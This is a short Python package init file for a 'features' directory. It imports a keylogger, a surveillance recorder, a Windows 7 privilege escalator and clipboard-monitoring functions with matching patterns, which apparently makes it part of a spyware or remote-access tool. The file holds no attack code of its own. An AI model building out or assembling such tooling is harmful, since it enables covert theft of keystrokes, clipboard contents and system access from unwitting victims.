# This file marks the 'features' directory as a Python package.
# You can optionally import frequently used classes/functions here for convenience.

# Example: (uncomment if you want to enable direct imports)
from .keylogger import KeyLogger, UnifiedKeyLogger
from .recording import create_surveillance_recorder
from .privilege import Windows7PrivilegeEscalator
from .clipboard import start_clipboard_monitor, print_clipboard_history, clipboard_history, PATTERNS